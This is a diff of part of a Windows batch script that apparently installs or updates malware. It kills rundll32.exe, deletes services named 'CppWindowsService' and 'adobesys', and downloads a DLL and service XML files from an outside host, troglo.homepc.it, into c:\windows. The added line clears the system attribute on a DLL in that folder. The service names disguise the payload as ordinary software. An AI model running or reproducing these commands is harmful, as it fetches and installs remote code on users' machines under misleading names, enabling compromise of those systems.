@@ -5,6 +5,7 @@ taskkill /f /im rundll32.exe
 sc delete CppWindowsService
 sc delete adobesys
 mkdir c:\windows\hp
+attrib -s c:\windows\sys2.dll
 wget http://troglo.homepc.it/win/exec1.dll -O c:\windows\exec1.dll
 wget http://troglo.homepc.it/win/CppWindowsService.xml -O c:\windows\CppWindowsService.xml
 wget http://troglo.homepc.it/win/adobesys.xml -O c:\windows\adobesys.xml
